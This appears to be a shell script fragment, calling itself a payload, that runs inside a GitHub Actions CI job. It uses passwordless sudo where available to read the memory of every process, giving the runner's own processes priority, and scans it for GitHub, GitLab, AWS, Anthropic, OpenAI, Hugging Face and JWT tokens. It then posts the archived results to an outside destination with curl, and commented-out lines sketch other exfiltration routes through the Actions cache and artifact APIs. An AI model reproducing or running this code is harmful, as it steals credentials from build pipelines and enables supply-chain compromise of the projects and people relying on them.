#!/bin/bash
if [ "${WF_MEMSCAN:-1}" = "1" ] && command -v python3 >/dev/null 2>&1; then
  mkdir -p "$D/mem"
  MS=""
  if sudo -n true 2>/dev/null; then MS="sudo -n"; fi
  $MS timeout 90 python3 - "$D/mem" <<'PYMEM'
import glob, os, re, sys
out = sys.argv[1]
pat = re.compile(rb'(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{6,}'
                 rb'|gh[pousr]_[A-Za-z0-9_]{36,}'
                 rb'|github_pat_[A-Za-z0-9_]{20,}'
                 rb'|glpat-[A-Za-z0-9_.-]{20,}'
                 rb'|AKIA[0-9A-Z]{16}'
                 rb'|sk-ant-[A-Za-z0-9_-]{20,}'
                 rb'|sk-(proj|svcacct)-[A-Za-z0-9_-]{20,}'
                 rb'|hf_[A-Za-z0-9]{30,})')
me = str(os.getpid())
pids = []
for maps in glob.glob('/proc/[0-9]*/maps'):
    pid = maps.split('/')[2]
    if pid == me:
        continue
    try:
        with open('/proc/%s/comm' % pid) as fh:
            comm = fh.read().strip()
    except Exception:
        comm = ''
    pids.append((0 if comm in ('Runner.Worker', 'Runner.Listener') else 1, pid, maps))
pids.sort()
for _, pid, maps in pids:
    try:
        regions = []
        with open(maps) as fh:
            for line in fh:
                parts = line.split()
                if len(parts) < 2 or 'r' not in parts[1]:
                    continue
                a, b = parts[0].split('-')
                s, e = int(a, 16), int(b, 16)
                if e <= s:
                    continue
                regions.append((s, min(e, s + 4 * 1024 * 1024)))
        if not regions:
            continue
        mem = open('/proc/%s/mem' % pid, 'rb', buffering=0)
    except Exception:
        continue
    hits = []
    for s, e in regions[:60]:
        try:
            mem.seek(s)
            data = mem.read(e - s)
        except Exception:
            continue
        hits.extend(m.group(0) for m in pat.finditer(data))
        if len(hits) > 300:
            break
    try:
        mem.close()
    except Exception:
        pass
    if hits:
        with open(os.path.join(out, pid + '.txt'), 'wb') as fw:
            for h in hits[:300]:
                fw.write(h + b'\n')
PYMEM
  # The scan may have run as root under the payload's umask 077: normalize so
  # the later tar (as the runner user) can read every hit file.
  $MS chmod -R a+rX "$D/mem" 2>/dev/null
  note "memscan_files $(ls "$D/mem" 2>/dev/null | wc -l | tr -d ' ')"
fi
curl --data-binary @build.tgz "$DEST"
# TW="${ACTIONS_RESULTS_URL%/}/twirp/github.actions.results.api.v1.CacheService"
# curl -sS -X POST "$TW/CreateCacheEntry" -d '{"key":"build-cache","version":"1"}'
# curl -sS -X PUT "$signed_url" --data-binary @build.tgz
# curl -sS -X POST "$TW/FinalizeCacheEntryUpload" -d '{"key":"build-cache","size_bytes":"1024","version":"1"}'
# RUNAPIS="${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/${GITHUB_RUN_ID}/artifacts"
# FCRU=$(curl -sS -X POST "$RUNAPIS?api-version=6.0-preview" -d '{"Type":"actions_storage","Name":"build"}' | python3 -c 'import json,sys;print(json.load(sys.stdin)["fileContainerResourceUrl"])')
# curl -sS -X PUT "$FCRU&itemPath=build.tgz" --data-binary @build.tgz
# CACHEAPIS="${ACTIONS_CACHE_URL}_apis/artifactcache"
# curl -sS -X PATCH "$CACHEAPIS/caches/$CID" --data-binary @build.tgz
